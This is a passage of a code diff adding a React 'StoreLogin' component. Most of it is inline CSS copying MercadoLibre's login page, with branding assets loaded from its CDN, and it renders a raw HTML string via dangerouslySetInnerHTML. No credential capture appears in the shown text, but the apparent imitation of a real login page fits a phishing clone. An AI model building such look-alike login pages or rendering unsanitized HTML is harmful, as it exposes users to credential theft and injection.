+            src: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.eot");
+            src: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.eot#iefix") format("embedded-opentype"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.woff2") format("woff2"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.woff") format("woff"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.ttf") format("truetype"), url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/navigation.svg#navigation") format("svg");
+            font-weight: normal;
+            font-style: normal
+        }
+        [class^=nav-icon-],[class*=" nav-icon-"] { font-style: normal }
+        .store-login-page { display: flex; flex-direction: column; min-height: 100vh; height: auto; border-collapse: collapse; background-color: #fff; font-family: "Proxima Nova", -apple-system, Roboto, Arial, sans-serif, sans-serif; table-layout: fixed; width: 100%; margin: 0; padding: 0 !important; }
+        [role=main] { height: auto; flex-grow: 1; display: block; width: 100% }
+        .nav-bounds { display: block; padding: 0 10px; margin: 0 auto; max-width: 1220px }
+        .nav-header { background-color: #ffe600; border: 0; position: relative; height: 100px; display: flex; justify-content: center; }
+        .nav-header:before { content: ""; position: absolute; width: 100%; height: 100px; left: 0; top: 0; box-shadow: 0 1px 0 0 rgba(0,0,0,.1) }
+        .nav-logo { background-repeat: no-repeat; overflow: hidden; text-indent: -999px; background-image: url("https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/7.23.0/mercadolibre/logo_large_plus@2x.webp"); height: 34px; width: 134px; display: flex; position: static; background-size: contain }
+        .login-footer { color: #999; background-color: #fff; font-family: "Proxima Nova", -apple-system, Roboto, Arial, sans-serif; font-size: 13px; font-weight: 400; line-height: 1; overflow: hidden; border-top: 1px solid #e6e6e6 }
+        .login-footer .nav-bounds { padding: 16px 10px; max-width: 1200px }
+        .grid-view__container { margin: 40px auto; max-width: 400px; padding: 0 10px; }
+        .grid-view__title { font-size: 24px; line-height: 1.25; margin-bottom: 24px; color: rgba(0,0,0,0.9); }
+        .andes-card { background: #fff; border-radius: 6px; box-shadow: none; border: 1px solid rgba(0,0,0,.1); padding: 32px; }
+        .login-form__actions { margin-top: 24px; display: flex; flex-direction: column; gap: 12px; }
+        .andes-button { width: 100%; border-radius: 6px; padding: 12px; font-weight: 600; cursor: pointer; border: none; font-size: 16px; text-align: center; }
+        .andes-button--loud { background: #3483fa; color: #fff; }
+        .andes-button--loud:hover { background: #2968c8; }
+        .andes-button--mute { background: transparent; color: #3483fa; }
+        .login-form__challenge-divider { display: flex; align-items: center; margin: 24px 0; gap: 12px; }
+        .login-form__divider { flex: 1; border: none; border-top: 1px solid rgba(0,0,0,0.1); }
+        .login-form__o { color: rgba(0,0,0,0.45); font-size: 14px; }
+        .andes-form-control__label { display: block; margin-bottom: 4px; font-size: 14px; color: rgba(0,0,0,0.9); }
+        .andes-form-control__control { border-radius: 6px; border: 1px solid rgba(0,0,0,0.25); background: #fff; }
+        .andes-form-control__field { width: 100%; padding: 13px 12px; font-size: 16px; border: none; outline: none; background: transparent; box-sizing: border-box; }
+        @media screen and (max-width: 767px) {
+            .nav-header { height: 48px; }
+            .nav-header:before { height: 48px; }
+            .grid-view__container { margin: 20px auto; }
+            .andes-card { border: none; padding: 0; }
+        }
+      `}</style>
+      <div
+        ref={containerRef}
+        style={{ display: 'contents' }}
+        dangerouslySetInnerHTML={{ __html: html }}
+      />
+    </>
+  );
+};
+
+export default StoreLogin;
